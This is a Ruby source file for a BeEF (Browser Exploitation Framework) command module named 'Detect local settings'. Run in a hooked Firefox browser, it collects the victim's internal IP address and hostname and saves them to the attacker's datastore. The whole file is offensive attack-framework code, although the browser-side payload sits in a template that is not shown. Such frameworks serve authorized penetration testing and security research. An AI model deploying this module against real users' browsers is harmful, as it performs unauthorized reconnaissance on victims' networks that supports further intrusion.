module BeEF
module Modules
module Commands

class Detect_local_settings < BeEF::Command
  
  def initialize
    super({
      'Name' => 'Detect local settings',
      'Description' => 'Grab the local network settings (i.e internal ip address)',
      'Category' => 'Network',
      'Author' => ['pdp', 'wade', 'bm'],
      'File' => __FILE__,
      'Target' => {
        'browser_name' => BeEF::Constants::Browsers::FF
      }
    })
    
    use 'beef.net.local'
    
    use_template!
  end
  
  def callback
    content = {}
    content['internal ip'] = @datastore['internal_ip'] if not @datastore['internal_ip'].nil?
    content['internal hostname'] = @datastore['internal_hostname'] if not @datastore['internal_hostname'].nil?
    
    content['fail'] = 'could not grab local network settings' if content.empty?
    
    save content
  end
  
end

end
end
end